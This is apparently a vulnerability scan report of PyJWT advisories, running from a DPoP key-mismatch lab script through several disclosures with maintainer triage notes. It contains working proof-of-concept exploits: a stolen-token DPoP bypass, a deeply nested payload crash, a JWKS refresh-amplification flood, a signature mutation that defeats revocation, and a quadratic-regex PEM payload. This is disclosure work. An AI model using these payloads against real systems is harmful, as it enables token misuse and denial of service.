    proof: str,
    *,
    reject_private_header_jwk: bool = False,
) -> dict[str, Any]:
    """Model the security-relevant stages of an RFC 9449 resource server."""
    access_claims = jwt.decode(
        access_token,
        ACCESS_TOKEN_SECRET,
        algorithms=["HS256"],
        issuer="https://authorization.example",
        audience="resource-api",
        options={"require": ["exp", "iss", "aud", "sub", "cnf"]},
    )
    header = jwt.get_unverified_header(proof)
    if header.get("typ") != "dpop+jwt" or header.get("alg") != "EdDSA":
        raise ValueError("invalid DPoP header policy")
    jwk = header.get("jwk")
    if not isinstance(jwk, dict):
        raise ValueError("missing DPoP JWK")
    if reject_private_header_jwk and any(
        member in jwk for member in ("d", "p", "q", "dp", "dq", "qi", "k")
    ):
        raise ValueError("DPoP header JWK contains private material")
    if jwk_thumbprint(jwk) != access_claims["cnf"]["jkt"]:
        raise ValueError("DPoP key does not match cnf.jkt")

    key = jwt.PyJWK.from_dict(jwk)
    proof_claims = jwt.decode(
        proof,
        key,
        algorithms=["EdDSA"],
        options={"require": ["htm", "htu", "iat", "jti", "ath"]},
    )
    if proof_claims["htm"] != HTTP_METHOD or proof_claims["htu"] != HTTP_URI:
        raise ValueError("DPoP request binding mismatch")
    if proof_claims["ath"] != access_token_hash(access_token):
        raise ValueError("DPoP access-token hash mismatch")
    return access_claims


def main() -> None:
    legitimate_holder = Ed25519PrivateKey.generate()
    attacker = Ed25519PrivateKey.generate()
    legitimate_x = public_x(legitimate_holder)
    attacker_x = public_x(attacker)

    legitimate_public_jwk = {
        "alg": "EdDSA",
        "crv": "Ed25519",
        "kty": "OKP",
        "x": legitimate_x,
    }
    mismatched_proof_jwk = {
        **legitimate_public_jwk,
        "d": private_d(attacker),
    }
    pinned_jkt = jwk_thumbprint(legitimate_public_jwk)

    now = int(time.time())
    access_token = jwt.encode(
        {
            "aud": "resource-api",
            "cnf": {"jkt": pinned_jkt},
            "exp": now + 300,
            "iat": now,
            "iss": "https://authorization.example",
            "scope": "admin:read",
            "sub": "legitimate-holder",
        },
        ACCESS_TOKEN_SECRET,
        algorithm="HS256",
    )
    proof_claims = {
        "ath": access_token_hash(access_token),
        "htm": HTTP_METHOD,
        "htu": HTTP_URI,
        "iat": now,
        "jti": "synthetic-attacker-proof",
    }
    attacker_proof = jwt.encode(
        proof_claims,
        attacker,
        algorithm="EdDSA",
        headers={"jwk": mismatched_proof_jwk, "typ": "dpop+jwt"},
    )

    imported = jwt.PyJWK.from_dict(mismatched_proof_jwk).key
    imported_x = b64url(
        imported.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
    )
    accepted_claims = verify_resource_request(access_token, attacker_proof)

    public_only_rejected = False
    public_only_error = None
    public_only_proof = jwt.encode(
        proof_claims,
        attacker,
        algorithm="EdDSA",
        headers={"jwk": legitimate_public_jwk, "typ": "dpop+jwt"},
    )
    try:
        verify_resource_request(access_token, public_only_proof)
    except Exception as error:
        public_only_rejected = True
        public_only_error = type(error).__name__

    private_member_control_rejected = False
    private_member_control_error = None
    try:
        verify_resource_request(
            access_token,
            attacker_proof,
            reject_private_header_jwk=True,
        )
    except Exception as error:
        private_member_control_rejected = True
        private_member_control_error = type(error).__name__

    result = {
        "environment": {
            "PyJWT": jwt.__version__,
            "PyJWT_source": str(jwt.__file__),
            "Python": platform.python_version(),
            "cryptography": version("cryptography"),
            "source_ref": os.environ.get("PYJWT_SOURCE_REF", "installed-release"),
        },
        "dpop_binding": {
            "access_token_subject": accepted_claims["sub"],
            "access_token_scope": accepted_claims["scope"],
            "pinned_jkt": pinned_jkt,
            "proof_jkt": jwk_thumbprint(mismatched_proof_jwk),
            "thumbprint_matches": jwk_thumbprint(mismatched_proof_jwk) == pinned_jkt,
        },
        "imported_key": {
            "declared_x": legitimate_x,
            "attacker_x": attacker_x,
            "actual_imported_x": imported_x,
            "actual_key_is_attacker_key": imported_x == attacker_x,
            "actual_key_matches_declared_x": imported_x == legitimate_x,
        },
        "vulnerable_composition": {
            "stolen_sender_constrained_token_accepted": accepted_claims["sub"]
            == "legitimate-holder",
            "attacker_has_legitimate_private_key": False,
        },
        "controls": {
            "public_only_jwk_rejected": public_only_rejected,
            "public_only_error": public_only_error,
            "reject_private_header_jwk_blocks_attack": private_member_control_rejected,
            "private_member_control_error": private_member_control_error,
        },
    }

    assert jwk_thumbprint(mismatched_proof_jwk) == pinned_jkt
    assert imported_x == attacker_x
    assert imported_x != legitimate_x
    assert accepted_claims["sub"] == "legitimate-holder"
    assert public_only_rejected and public_only_error == "InvalidSignatureError"
    assert private_member_control_rejected and private_member_control_error == "ValueError"
    print(json.dumps(result, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()

```
```text
06-practical-testing/pyjwt-okp-dpop-binding-bypass-lab.py
```

A public example of the affected composition exists in StrongDM's `agentic-auth` Flask middleware: it computes an OKP thumbprint from `x` and subsequently passes the entire JWK to `PyJWK.from_dict()` for EdDSA DPoP verification without rejecting `d`.

### Impact

The PyJWT-owned issue is acceptance of internally inconsistent cryptographic key material: the JWK can declare one public key while the operative private key corresponds to another.

In a DPoP verifier that:

* calculates `cnf.jkt` / JWK thumbprints from the declared `x`,
* passes the same JWK to PyJWT for signature verification, and
* does not reject private JWK parameters,

an attacker who steals a sender-constrained access token can use the token without possessing the legitimate holder's private key.

RFC 9449 §4.2 requires DPoP implementations to reject private key parameters in proof JWKs. Therefore the demonstrated authentication bypass additionally requires a DPoP implementation that omits this check. RFC-compliant DPoP implementations that reject `d` are not vulnerable to the demonstrated attack.

### Maintainer assessment (2026-09-12)

We independently reproduced the PyJWT-owned issue: importing a private OKP JWK with non-corresponding `x` and `d` components returned the private key derived from `d` while accepting the conflicting declared public identity. The precise library impact is loss of JWK key-component consistency; a caller that uses `x` as the JWK identity and the returned key for cryptographic operations can act on two different key identities.

Exact boundary checks found Ed25519 JWK import absent in 2.0.1 and the inconsistent-pair behavior present in 2.1.0. Ed448 JWK import was absent in 2.1.0 and the behavior was present in 2.2.0. Both curves reproduced in 2.14.0 and the tested pre-fix source. These samples support the existing affected metadata (`>= 2.1.0, <= 2.14.0`) and the per-curve introduction points, but do not claim exhaustive testing of every intervening release.

The fix is on `master` in commit `3cd9ceec33ced359decbad75b413ad668ae6332c`. It derives the public bytes from `d`, compares them with `x`, and rejects a mismatch. Fresh independent Astra/max review accepted the exact tree `9f219601e39026c7094d48f3fbb6678951878aa8` with no blocking findings or required revisions. Targeted red/green and sibling-path checks passed, and the exact repository CI command `python -m tox` passed all 35 required environments both before and after the commit.

The reported DPoP stolen-token scenario additionally requires an application to pass a private JWK from the proof header without rejecting private-key parameters. RFC 9449 sections 4.2 and 4.3 require such parameters to be absent or rejected, so that bypass is application-dependent and outside PyJWT's security-policy scope; it is not used to characterize the PyJWT-owned impact.

The fix is not yet contained in a released PyJWT 2.x version, so `patched_versions` remains empty and this advisory remains unpublished. The next lifecycle step is to move the advisory from triage to draft now that the verified fix is on `master`; publication must wait until a new released 2.x version is confirmed to contain the fix and is recorded as the patched boundary.
---

### Maintainer release update (2026-09-23)

PyJWT 2.15.0 is the first released version containing the OKP JWK consistency fix. Its GitHub release tag points to commit `1d41a6478e1562e68ff667fcd703356acf085f68`, which includes fix commit `3cd9ceec33ced359decbad75b413ad668ae6332c`. PyPI published both the wheel and source distribution from that release commit through the successful production workflow at https://github.com/jpadilla/pyjwt/actions/runs/35891602963.

The published PyPI wheel (`pyjwt-2.15.0-py3-none-any.whl`, SHA-256 `7a3742debf6b879e912dbb9819ceec1594be812452b78c5f2e2dfc56564954f8`) was checked directly: matching Ed25519 and Ed448 `x`/`d` private JWK components import successfully, while mismatched components raise `InvalidKeyError`. The supported affected range remains `>= 2.1.0, <= 2.14.0`; the patched version is `2.15.0`. The earlier statement that no released patched version exists is superseded by this update.

The PyJWT-owned impact is acceptance of internally inconsistent OKP key material in affected versions. The reported DPoP stolen-token scenario additionally requires an application to accept private key parameters from a proof header, contrary to RFC 9449; it is not the basis for this advisory's classification. CVSS v3.1 6.5 (Medium), CWE-345, and CWE-348 are unchanged.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-101918?s=github&n=pyjwt&t=pypi&vr=%3E%3D2.0.0a1%2C%3C%3D2.14.0"><img alt="medium 5.3: CVE--2026--101918" src="https://img.shields.io/badge/CVE--2026--101918-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Uncaught Exception</i>

<table>
<tr><td>Affected range</td><td><code>>=2.0.0a1<br/><=2.14.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.15.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.291%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

`PyJWKClient.get_signing_key_from_jwt(token)` — the first step of the JWKS
verification flow documented in `docs/usage.rst` — must decode a token's
payload before its signature can be checked, via
`jwt.api_jwt.decode_complete(token, options={"verify_signature": False})`.
That call parses the payload with `json.loads` in `PyJWT._decode_payload`
(`jwt/api_jwt.py:297-300`), whose `except` clause catches only `ValueError`.
A payload that is valid JSON but nested ~20,000 levels deep makes
`json.loads` raise `RecursionError`, which is **not** a `ValueError` and
escapes as a raw, undocumented exception type — not `DecodeError`,
`InvalidTokenError`, or `PyJWTError`, so every documented error-handling
pattern in `docs/usage.rst` misses it.

The token needs no valid signature and no network access — the crash
happens during payload parsing, before the `kid` is even looked up. A
single unauthenticated ~50KB request crashes the caller's auth handler
(HTTP 500 / dead worker), repeatably. The same path is reachable through
plain `jwt.decode(token, options={"verify_signature": False})` too.

Notably, this project already fixed the **identical** bug class for the
JWS **header** path — `PyJWS._load` catches `(ValueError, RecursionError)`
and wraps it in `DecodeError` (`jwt/api_jws.py:360-361`), and
`CHANGELOG.rst` (v2.14.0, "Security") states "Handle deeply nested and
malformed JWS/JWK input without uncaught recursion errors." The payload
path — the one part of a forged token an unauthenticated attacker fully
controls — was left catching `ValueError` alone, so that security fix does
not fully hold.

A second, related instance: `PyJWKClient.fetch_data` (`jwt/jwks_client.py:168`)
parses a JWKS endpoint's response with `json.load(response)` inside a
`try` that only catches `(URLError, TimeoutError, http.client.HTTPException)`
— a deeply-nested JSON response from a JWKS endpoint raises the same raw
`RecursionError`, uncaught entirely (worse than the payload path, which at
least caught plain `ValueError`).

**Affected versions:** confirmed present in the current release, 2.14.0,
and on the current `master` branch (commit `4adcd02722f5011c60079d3978dfc167b9a8eaa5`).

## Reproduction

```python
import base64, json, jwt

def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")

header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64url(b"[" * 20_000 + b"]" * 20_000)
token = (header + b"." + payload + b"." + b64url(b"forged-sig")).decode()

jwt.decode(token, options={"verify_signature": False})
# raises: RecursionError (not DecodeError/InvalidTokenError/PyJWTError)
```

Control: the same deeply-nested structure moved into the token's **header**
instead of its payload is correctly converted to `jwt.DecodeError` by the
already-hardened `jwt/api_jws.py:360` — confirming the payload path is
specifically the missed half of the v2.14.0 hardening, not a general gap.

## Impact assessment

Unauthenticated denial-of-service via unhandled exception on an auth path.
Not an auth bypass — rated medium. With signature verification enabled,
this parse runs after `_verify_signature`, so only the pre-verification
paths (`get_signing_key_from_jwt`, explicit `verify_signature=False`) are
attacker-reachable pre-auth; the JWKS-endpoint variant requires control of
(or a MITM on) the configured JWKS endpoint rather than being reachable
from an arbitrary client token.

## Suggested fix

In `jwt/api_jwt.py:299`, change `except ValueError as e:` to
`except (ValueError, RecursionError) as e:`, mirroring
`jwt/api_jws.py:360` exactly. In `jwt/jwks_client.py`, add the same
`(ValueError, RecursionError)` handling around `json.load(response)` in
`fetch_data`, raising `PyJWKClientError` (consistent with the method's
existing documented error contract). A patch implementing both, verified
against the full test suite (457 passed, 4 skipped — pre-existing,
environment-related) and against the reproduction above (now correctly
raises `DecodeError`), is attached (`fix.patch`).

## Discovery method

Found and verified using `scopegrep` (https://github.com/not-ekalabya/scopegrep)
— a semantic code-retrieval tool that surfaces every other call site of a
symbol alongside relevance-ranked results, which is what surfaced the
already-hardened header path as the direct comparison here — paired with
an LLM coding agent (GLM-5.3) run as an open-ended security review of this
repository. Independently reproduced against the exact commit above before
this report was written. Happy to share the full session transcript on
request.

## Disclosure status

Not shared with any other party or published. Submitting through this
private channel per the project's stated security policy; no planned
public/conference disclosure ahead of a coordinated timeline.


---

## Maintainer triage update (2026-09-22)

### Confirmed finding and scope

We confirmed that an attacker-controlled recursively nested JWT payload can cause a raw Python `RecursionError` to escape PyJWT at PyJWT 2.14.0 and the tested current source. The confirmed in-scope paths are direct decoding with `verify_signature=False` and `PyJWKClient.get_signing_key_from_jwt`, where payload parsing occurs before key lookup.

The demonstrated impact is limited to an uncaught exception for the affected call, which may surface as an application HTTP 500 when the application does not catch it. Testing did not demonstrate a worker or process crash, persistent resource exhaustion, resource amplification, authentication bypass, or confidentiality or integrity impact.

The separate JWKS-response subclaim is out of scope under the policy boundary that requires the application to trust its configured JWKS source and transport. The confirmed payload finding is not a duplicate of the earlier protected-header parser finding: it occurs in a distinct payload parsing path that remained affected after the earlier header-only fix.

### Version and remediation status

Historical testing reproduced the confirmed payload behavior in all 20 official supported PyJWT 2.x releases from 2.0.0a1 through 2.14.0, inclusive. Unsupported PyJWT 1.7.1 also reproduces the behavior, but it is excluded from the advisory range under the supported-2.x policy. No supported unaffected release and no patched release exists. The exact evidence is `/Users/jpadilla/.codex/security-advisories/pyjwt/GHSA-42vr-xj54-vc7v-historical-range-20260922.md` (SHA-256 `c48f1ac35641e9382d53e6a879a71ad9a8fb4432bbe871f2b8330f8d166a2d81`) and `/Users/jpadilla/.codex/security-advisories/pyjwt/historical-range-42vr-20260922/historical-range-results.json` (SHA-256 `324997f231561bf6da39b8f9d1e272f69bfde8871a7863f5cb7b70e22e91f076`). The evidence-backed supported affected range is `>= 2.0.0a1, <= 2.14.0`.

Historical range verification is complete. A local fix commit exists and has passed independent review and the complete local CI suite, but it has not been merged into `master` or released. Consequently, `patched_versions` remains empty and this advisory remains in `triage`. The remaining next step is a maintainer decision on remediation and merge. After a fix lands in `master` and is released, `patched_versions` and advisory lifecycle can be updated in a separate approved batch.

---

## Maintainer remediation update (2026-09-23)

The confirmed payload-parser finding has been fixed on `master`. Commit
`5fde08a6cf906aa7698de2d6391d88b73006b17b` converts a recursive
payload parse failure to the expected `DecodeError`; commit
`9bc06658f875b9b40091539140bbbdc4639161c3` makes the regression tests
deterministic across supported Python versions. This update supersedes the
2026-09-22 remediation-status statement that the fix had not landed.

The original pre-verification payload reproducer and the
`PyJWKClient.get_signing_key_from_jwt` path were covered by regression tests.
The exact landed tree passed the full 39-environment local tox matrix and
GitHub CI for commit `9bc06658f875b9b40091539140bbbdc4639161c3` passed
all 25 jobs, including Ubuntu Python 3.14 and 3.15. The demonstrated impact
remains an uncaught request-level exception in affected releases; there is
still no evidence of process termination, persistent resource exhaustion,
authentication bypass, or confidentiality or integrity impact.

The supported affected range remains `>= 2.0.0a1, <= 2.14.0`. The latest
released version is 2.14.0, which predates these commits; no released
patched version exists yet, so `patched_versions` remains unset. CVSS v3.1
5.3 (Medium) and CWE-248 remain unchanged. The advisory may now move from
triage to private draft. The next lifecycle step is a new supported 2.x
release containing the fix, followed by separately approved patched-version
and publication updates after release verification.

---

## Maintainer release update (2026-09-23)

PyJWT 2.15.0 is the first released version containing the payload-parser fix. Its GitHub release tag points to commit `1d41a6478e1562e68ff667fcd703356acf085f68`, which includes fix commit `5fde08a6cf906aa7698de2d6391d88b73006b17b` and deterministic regression-test commit `9bc06658f875b9b40091539140bbbdc4639161c3`. PyPI published both the wheel and source distribution from that release commit through the successful production workflow at https://github.com/jpadilla/pyjwt/actions/runs/35891602963.

The published PyPI wheel (`pyjwt-2.15.0-py3-none-any.whl`, SHA-256 `7a3742debf6b879e912dbb9819ceec1594be812452b78c5f2e2dfc56564954f8`) was checked directly: the deeply nested unsigned payload now raises `DecodeError`, while an ordinary unsigned payload still decodes. The supported affected range remains `>= 2.0.0a1, <= 2.14.0`; the patched version is `2.15.0`. Earlier statements in this advisory that no released patched version exists are superseded by this update.

The confirmed impact remains an uncaught request-level exception in affected versions, not a demonstrated process crash or authentication bypass. The separate JWKS-response subclaim remains outside this advisory's confirmed PyJWT-owned scope.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-101917?s=github&n=pyjwt&t=pypi&vr=%3C%3D2.13.0"><img alt="medium 5.3: CVE--2026--101917" src="https://img.shields.io/badge/CVE--2026--101917-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Allocation of Resources Without Limits or Throttling</i>

<table>
<tr><td>Affected range</td><td><code><=2.13.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.14.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.354%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Summary
CVE-2026-48524 (GHSA-fhv5-28vv-h8m8, "PyJWKClient unbounded JWKS endpoint requests via attacker-controlled kid values (DoS)") was fixed in 2.13.0 by stopping fetch_data() from clearing the cache on a fetch error. That closed one amplification path but did not add the mitigation the advisory's title implies: there is still no rate-limit, negative-cache, or minimum-refresh-interval for unknown kids.

At HEAD, get_signing_key(kid) (jwt/jwks_client.py:185-211), on any unknown kid, calls get_signing_keys(refresh=True), and refresh=True bypasses jwk_set_cache unconditionally and forces a fresh fetch_data(). The kid is read from the unverified token header (get_signing_key_from_jwt decodes with verify_signature=False), so no valid token and no authentication is required. lru_cache does not cache the raised exception, so even the same unknown kid repeated re-fetches on every call.

Affected
pyjwt <= 2.13.0 (the latest release; the patched release for CVE-2026-48524). No fixed version yet.

Proof of concept (verified on 2.13.0, cache enabled = realistic prod config)
import threading, http.server, socketserver, json
from jwt import PyJWKClient
hits = {'n': 0}
JWKS = json.dumps({"keys":[{"kty":"oct","kid":"real","k":"AAAA"}]}).encode()
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        hits['n'] += 1
        self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers()
        self.wfile.write(JWKS)
    def log_message(self,*a): pass
srv = socketserver.TCPServer(('[127.0.0.1](https://127.0.0.1/)',0), H); port = srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()
c = PyJWKClient(f'http://127.0.0.1/:{port}[/jwks](tg://bot_command?command=jwks).json', cache_keys=True, lifespan=3600)
for i in range(8):
    try: c.get_signing_key(f'attacker-unknown-kid-{i}')
    except Exception: pass
before = hits['n']
for _ in range(5):
    try: c.get_signing_key('same-unknown')
    except Exception: pass
print('distinct unknown kids: 8 -> fetches:', hits['n'])
print('same unknown kid x5 -> extra fetches:', hits['n'] - before)

Output:
  distinct unknown kids: 8 -> fetches: 9
  same unknown kid x5 -> extra fetches: 5
Each unknown kid forces a fresh JWKS fetch; a repeated identical unknown kid still re-fetches every time against an unexpired cache. No rate-limit or negative-cache.

Impact
One unauthenticated request -> one outbound JWKS HTTP fetch + full JSON parse on the victim server. An attacker floods tokens carrying junk kids, so the victim hammers its own JWKS/IdP endpoint (amplification: attacker -> victim -> IdP), exhausting victim CPU/sockets and potentially tripping the JWKS provider's rate-limit, causing an application-wide auth outage. This is the unauthenticated DoS the parent advisory is named for, still reachable after the 2.13.0 fix.

Suggested fix
Guard the forced refresh on unknown kids: negative-cache unknown kids for a short TTL, or enforce a minimum interval between forced JWKS refreshes, so a repeated or unknown kid cannot force unbounded fetches.

Note: the same-kid-repeated result (5 identical unknown kids producing 5 fetches against an unexpired cache) shows this is request amplification, not legitimate key-rotation handling, since that refresh can never succeed.

Reported by Babakizo (Securva).

## Maintainer update — 2026-09-10

The maintainer confirmed the reported behavior against PyJWT 2.13.0. With JWKS caching
enabled, an unknown `kid` previously forced an unconditional JWKS refresh,
including when the same unknown value was repeated while the cached key set was
still valid. This allowed unauthenticated token headers to cause unnecessary
outbound JWKS requests and repeated parsing work.

The fix is now on `master` in commit `ba4853a`. `PyJWKClient` now applies a
30-second cooldown after successful JWKS fetches before permitting another
unknown-`kid` refresh, serializes concurrent refresh decisions per client, and
allows callers to configure or disable the cooldown. Cache-disabled behavior
and immediate retry after failed fetches remain unchanged.

Regression tests cover repeated unknown kids, cooldown expiry, concurrent
misses, cache-disabled operation, and invalid cooldown values. The available
full tox matrix, Ruff, and mypy checks pass. The fix will be included in the
next released 2.x version.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-102269?s=github&n=pyjwt&t=pypi&vr=%3C%3D2.13.0"><img alt="medium 4.8: CVE--2026--102269" src="https://img.shields.io/badge/CVE--2026--102269-lightgrey?label=medium%204.8&labelColor=fbb552"/></a> <i>Incorrect Behavior Order: Validate Before Canonicalize</i>

<table>
<tr><td>Affected range</td><td><code><=2.13.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.14.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.198%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

PyJWT 2.13.0 accepts compact JWS signature segments containing characters that
are not in the Base64URL alphabet. Appending `!!!!` to a valid signature does
not change the decoded signature bytes or authenticated claims, but it changes
the serialized token and its SHA-256 hash. An application that indexes logout
or revocation state by the raw token therefore rejects the logged-out token and
accepts its no-key alternate serialization.

This report separates two issues: permissive compact-JWS decoding is the
library behavior, while using raw serialized JWT text as a security identity is
a dangerous application composition. A `jti`-indexed control blocks both
representations.

## Affected Version

Confirmed with PyJWT 2.13.0 on CPython 3.13. The mutation changes only the
signature segment and requires no signing key.

## End-to-End Reproduction

```bash
.venv-research/bin/python 06-practical-testing/revocation-bypass-lab.py
```

The loopback-only lab performs:

1. Issue a valid HS256 admin token.
2. Access `/protected` successfully.
3. Log out the canonical token and store `SHA256(raw_token)`.
4. Confirm canonical replay returns HTTP 401.
5. Append `!!!!` to only the signature segment.
6. Confirm the mutated token has the same verified claims and signature bytes,
   a different raw hash, and receives HTTP 200.
7. Repeat with `jti`-indexed revocation and confirm both forms return HTTP 401.

Observed statuses for raw-token revocation were `200 -> logout -> 401` for the
canonical token and `200` for the alternate serialization. The `jti` control
returned `401` for both replays after logout.

## Security Boundaries and Severity

This is not signature forgery: the attacker starts with a valid token and
cannot alter its claims. Impact requires a consumer to bind revocation, replay
state, rate limits, or cache identity to the raw compact string. Under that
composition, an authenticated user can bypass logout or token-specific
revocation without the signing key. Medium is suggested for triage because the
security impact is real but application-dependent.

## Recommended Fix

- Reject signature segments containing characters outside `[A-Za-z0-9_-]`.
- Reject padding and other non-canonical Base64URL encodings for compact JWS.
- Add regression tests proving malformed signature encodings fail before or
  during verification.
- Document that applications must use a semantic identifier such as `jti`, not
  the raw serialized token, for revocation and replay state.

## Maintainer update — 2026-09-09

We reproduced the reported behavior on the verified `master` commit `8915570`: appending `!!!!` to a valid compact-JWS signature segment is accepted, produces the same decoded signature bytes and claims, and changes the serialized token hash. Existing JWS verification controls pass. The behavior is present in the tested release range represented by tags `2.4.0`, `2.8.0`, `2.10.1`, `2.12.1`, and `2.13.0`.

The security impact is conditional on an application using the raw serialized token as the identity for logout, revocation, replay, rate-limit, or cache state. Under that composition, an attacker who already holds a valid token can use an alternate serialization after the canonical string is revoked. This is not signature forgery or claim alteration; applications should use a semantic identifier such as `jti` for token identity.

The report is ready to be accepted as a draft for continued remediation. A narrow fix assessment recommends rejecting non-canonical Base64URL characters and padding in compact-JWS segments. No fix commit or release is claimed yet.

### Maintainer update — 2026-09-09

The fix has been rebased onto the current `master` as `e6f48401001609a8f99e71fcaf355fb895d508a8` and is ready to be pushed. Compact-JWS header, payload, and signature segments are now required to use the unpadded Base64URL alphabet and canonical re-encoding; a signature segment containing non-canonical characters such as `!!!!` is rejected before verification. Valid detached `b64=false` handling remains supported.

Verification on the rebased fix commit passed 372 tests with 4 intentional cryptography-environment skips; Ruff formatting/lint and `git diff --check` passed. The compressed-payload regression fixture was updated to valid canonical compact-JWS encoding. No release containing the fix has been published yet, so the patched version remains unset pending release planning.

The advisory remains medium severity and unpublished.

## Classification update — 2026-09-10

We completed the advisory classification review. The proposed CVSS 3.1 vector is `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N` and the proposed CWE classification is CWE-180. The issue permits alternate non-canonical serializations of an already valid signed token to bypass applications that identify tokens by their raw serialization; it does not forge signatures or alter claims. CWE-180 captures validation/canonicalization ordering.

These metadata changes do not alter the affected range, fix status, or lifecycle state.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-102270?s=github&n=pyjwt&t=pypi&vr=%3C%3D2.13.0"><img alt="medium 4.4: CVE--2026--102270" src="https://img.shields.io/badge/CVE--2026--102270-lightgrey?label=medium%204.4&labelColor=fbb552"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code><=2.13.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.14.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.192%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
There is a Re-DoS vulnerability in the `is_pem_format` function which results in a intesive CPU usage if an attacker is been able to provide a custom certificate.


### Details
The problem is that the lazy quantifier `.+?` will always first try to match as little as possible until it finds a `---- END`. Normally this means the complexity of this should be O(N). However, by providing an input which consists only of `----BEGIN CERTIFICATE-----` lines and no `---- END` line, the regex algorithm will first try to match the first line and then, with the lazy quantifier, all the lines until the end O(N), which then fails since it is unable to find a `---- END` line. It will then jump to the next line, resulting in N re-scans of the whole string, which means the complexity basically results in O(N²). 


### PoC
```python
import time
import re


BEGIN_LINE = b"-----BEGIN CERTIFICATE-----\n"

_PEMS = {
    b"CERTIFICATE",
    b"TRUSTED CERTIFICATE",
    b"PRIVATE KEY",
    b"PUBLIC KEY",
    b"ENCRYPTED PRIVATE KEY",
    b"OPENSSH PRIVATE KEY",
    b"DSA PRIVATE KEY",
    b"RSA PRIVATE KEY",
    b"RSA PUBLIC KEY",
    b"EC PRIVATE KEY",
    b"DH PARAMETERS",
    b"NEW CERTIFICATE REQUEST",
    b"CERTIFICATE REQUEST",
    b"SSH2 PUBLIC KEY",
    b"SSH2 ENCRYPTED PRIVATE KEY",
    b"X509 CRL",
}

_PEM_RE = re.compile(
    b"----[- ]BEGIN ("
    + b"|".join(_PEMS)
    + b""")[- ]----\r?
.+?\r?
----[- ]END \\1[- ]----\r?\n?""",
    re.DOTALL,
)


def is_pem_format(key: bytes) -> bool:
    return bool(_PEM_RE.search(key))


def make_payload(num_headers: int) -> bytes:
    return BEGIN_LINE * num_headers


def measure(num_headers: int) -> float:
    payload = make_payload(num_headers)
    start = time.perf_counter()
    is_pem_format(payload)  # returns False, but burns CPU getting there
    elapsed = time.perf_counter() - start
    print(
        f"  headers={num_headers:>4}  size={len(payload)//1024:>3} KB"
        f"   time={elapsed*1000:>7.1f} ms"
    )
    return elapsed


for n in (1000, 2000, 4000, 8000):
    measure(n)
```

### Impact
The attacker could use extensive resources, which could make the resource (e.g. a web server) unavailable.


### Maintainer update (2026-09-10): 
We reproduced the reported quadratic regex behavior on malformed PEM-like input: doubling repeated BEGIN lines produced approximately fourfold runtime growth, while equal-sized ordinary input remained negligible. The affected path is reached when an application passes attacker-controlled key or certificate bytes to PyJWT’s key preparation, and the impact is resource exhaustion. The fix is on master in commit 8b4e233a22206b34ec1186e912e75c0b2396ac07; it replaces the backtracking PEM regex with a bounded marker scan. Fresh Astra/max review accepted the fix and confirmed malformed, mixed-label, and valid-input controls. This is a distinct ReDoS finding from the later PEM-recognition report that shares the implementation commit. The fix has not yet shipped in a released PyJWT 2.x version, so this advisory is being moved to draft and remains unpublished pending release.

## Maintainer update — 2026-09-11

The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with the release recorded as the patched version.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-48522?s=github&n=pyjwt&t=pypi&vr=%3E%3D2.0.0%2C%3C%3D2.12.1"><img alt="medium 4.2: CVE--2026--48522" src="https://img.shields.io/badge/CVE--2026--48522-lightgrey?label=medium%204.2&labelColor=fbb552"/></a> <i>Unintended Proxy or Intermediary ('Confused Deputy')</i>

<table>
